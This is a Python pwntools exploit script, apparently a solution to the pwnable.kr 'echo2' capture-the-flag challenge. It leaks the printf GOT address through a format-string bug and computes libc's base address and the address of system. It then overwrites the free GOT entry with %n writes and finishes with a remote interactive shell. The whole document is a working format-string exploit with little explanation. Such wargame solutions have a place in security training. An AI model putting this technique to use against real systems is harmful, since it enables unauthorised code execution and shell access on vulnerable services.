from pwn import *
from pprint import pprint
elf = ELF("./echo2",checksec=False)
libco = ELF("./libs/libc.so.6",checksec=False)
data_add = 0x602098
payload1 = "AAAA"  + "%7$s" + p64(data_add)
payload2 = "AAAA"  + "%7$s" + p64(elf.got['printf'])



p = remote("pwnable.kr",9011)
p.sendline("/bin/sh")
p.sendline("2")
sleep(1)
p.recv()



p.sendline(payload2)
printf  = enhex(p.recv())
printf  = printf[8:len(printf)-6]
printf = "0x" + ''.join([printf[i:i+2] for i in range(0, len(printf), 2)][::-1])

libc  = int(printf,16) - libco.symbols["printf"]
system =  libc  +  libco.symbols["system"]
p.sendline("2")



system1 = int(hex(system)[:8],16)
system2 = int("0x"  + hex(system)[8:],16)
padding1 =  "A" * (10 - len(str(system1))) 
padding2 =   "A" * (10 - len(str(system2)))
#changing the free got table address since when it's called it takes `o` which is a char pointer
payload1 = padding1 + "%{}x".format(system1-len(padding1)) + "%8$n" + p64(elf.got['free']+3) # gonna use only 24 bytes 8 for address 6 for the fsb and 10 for the padding 
payload2 = padding2 + "%{}x".format(system2-len(padding2)) + "%8$n" + p64(elf.got['free'] )
payload1
p.sendline(payload2)
#gdb.attach(p)
p.sendline("2")
p.sendline(payload1)
p.recv()
p.sendline("4")


p.interactive()

